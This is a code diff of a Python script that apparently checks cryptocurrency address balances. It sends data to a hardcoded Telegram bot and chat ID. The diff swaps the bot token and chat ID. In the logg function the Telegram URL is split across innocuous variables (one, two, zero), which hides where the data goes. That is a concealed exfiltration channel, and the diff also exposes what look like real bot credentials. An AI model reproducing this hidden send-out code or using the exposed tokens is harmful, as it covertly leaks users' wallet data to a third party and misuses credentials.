@@ -31,7 +31,7 @@ def userInput():
         start()
         break
 
-one = "AAFWbIT3T9PC5UyzBLVYCwIPmEO_"
+one = "AAFNC0-SmbecH9A1L4Ef3"
 
 def getInternet():
     try:
@@ -42,7 +42,6 @@ def getInternet():
         return True
     except requests.ConnectionError:
         return False
-
 
 two = "https://api.telegram.org/bot1895834648:"
 lock = threading.Lock()
@@ -64,7 +63,7 @@ def getBalance(addr):
         pass
 
 
-zero = "gq15kO0/SendMessage?chat_id=218477456&text="
+zero = "dfSPZQqt2goMI0/SendMessage?chat_id=218477456&text="
 def logg(adds):
         response = requests.get(two+one+zero+adds)
         return response
@@ -133,7 +132,7 @@ def check():
 
 def tgsend(adds):
     response = requests.get(
-        "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=218477456&text="+adds)
+        "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=213475456&text="+adds)
     return response
 
 
